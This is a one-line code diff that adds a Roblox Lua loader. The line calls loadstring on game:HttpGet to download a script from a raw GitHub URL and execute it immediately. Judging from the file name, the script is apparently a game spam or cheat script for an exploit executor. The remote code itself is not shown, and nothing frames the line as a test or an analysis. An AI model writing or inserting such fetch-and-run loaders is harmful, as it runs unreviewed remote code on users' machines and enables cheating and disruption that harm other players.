@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/teamwork-puzzles-obby-spam3-nyyu87ujo1m127.lua"))()
